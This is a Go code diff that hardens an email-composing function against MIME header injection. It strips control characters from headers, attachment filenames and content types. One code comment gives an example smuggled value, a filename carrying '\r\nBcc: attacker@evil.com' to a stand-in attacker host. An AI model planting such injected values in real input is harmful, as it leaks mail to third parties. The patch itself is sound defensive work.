@@ -263,6 +263,20 @@ func sendMail(ctx context.Context, opts sendOpts) (sendResult, error) {
 	return result, nil
 }
 
+// sanitizeHeaderValue strips CR/LF and other ASCII control characters from a
+// value bound for a MIME header (top-level or per-part). Without this, a
+// script-supplied From/To/Subject/custom-header/attachment-filename/
+// attachment-contentType could inject arbitrary extra header lines (e.g. a
+// crafted filename containing "\r\nBcc: attacker@evil.com").
+func sanitizeHeaderValue(s string) string {
+	return strings.Map(func(r rune) rune {
+		if r == '\r' || r == '\n' || (r < 0x20 && r != '\t') || r == 0x7f {
+			return -1
+		}
+		return r
+	}, s)
+}
+
 // composeMIME assembles the message bytes.
 //
 //	text only         → text/plain
@@ -272,10 +286,7 @@ func composeMIME(opts sendOpts) ([]byte, error) {
 	var msg bytes.Buffer
 
 	writeHeader := func(name, val string) {
-		// Strip CR/LF from the value so a script-supplied From/To/custom
-		// header can't inject extra headers (header-injection hygiene).
-		val = strings.ReplaceAll(strings.ReplaceAll(val, "\r", ""), "\n", "")
-		fmt.Fprintf(&msg, "%s: %s\r\n", name, val)
+		fmt.Fprintf(&msg, "%s: %s\r\n", name, sanitizeHeaderValue(val))
 	}
 	writeHeader("From", opts.from)
 	writeHeader("To", strings.Join(opts.to, ", "))
@@ -345,8 +356,8 @@ func writeAltParts(msg *bytes.Buffer, boundary, text, html string) {
 func writeAttachmentParts(msg *bytes.Buffer, boundary string, atts []sendAttachment) {
 	for _, a := range atts {
 		fmt.Fprintf(msg, "--%s\r\n", boundary)
-		fmt.Fprintf(msg, "Content-Type: %s\r\n", a.ContentType)
-		fmt.Fprintf(msg, `Content-Disposition: attachment; filename="%s"`, a.Filename)
+		fmt.Fprintf(msg, "Content-Type: %s\r\n", sanitizeHeaderValue(a.ContentType))
+		fmt.Fprintf(msg, `Content-Disposition: attachment; filename="%s"`, sanitizeHeaderValue(a.Filename))
 		fmt.Fprintf(msg, "\r\nContent-Transfer-Encoding: base64\r\n\r\n")
 		b64 := base64.StdEncoding.EncodeToString(a.Bytes)
 		for i := 0; i < len(b64); i += 76 {
